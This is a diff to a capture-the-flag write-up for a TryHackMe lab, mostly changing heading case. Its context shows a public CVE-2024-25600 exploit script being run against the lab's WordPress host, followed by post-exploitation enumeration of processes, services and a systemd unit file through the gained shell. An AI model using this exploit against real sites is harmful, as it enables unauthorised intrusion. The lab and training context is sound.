@@ -166,11 +166,6 @@ https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py
 ┌──(duke㉿kali)-[~/Documents/THM_BrickByBrick]
 └─$ python3 CVE-2024-25600.py -u https://bricks.thm
 
-
-
-https://bricks.thm/phpmyadmin/
-https://bricks.thm/sample/
-
 ### print running proccess
 
 Shell> ps -fax
@@ -367,15 +362,13 @@ Shell> ps -fax
    9228 ?        Ss     0:00 /lib/NetworkManager/nm-inet-dialog
    9229 ?        S      0:01  \_ /lib/NetworkManager/nm-inet-dialog
 
-### print running services
+### Print running services
 
 systemctl list-units --type=service --state=running
 found
 ubuntu.service                                 loaded active running TRYHACK3M       
 
-
-
-### go to 
+### Go to 
 apache@tryhackme:/etc/systemd/system$ ls
 sshd.service
 sysinit.target.wants
@@ -384,7 +377,7 @@ timers.target.wants
 ubuntu.service
 vmtoolsd.service
 
-### print conf
+### Print conf
 apache@tryhackme:/etc/systemd/system$ cat ubuntu.service
 cat ubuntu.service
 [Unit]
@@ -398,7 +391,7 @@ Restart=on-failure
 [Install]
 WantedBy=multi-user.target
 
-### go to
+### Go to
 apache@tryhackme:/lib/NetworkManager$ ls 
 ls
 VPN
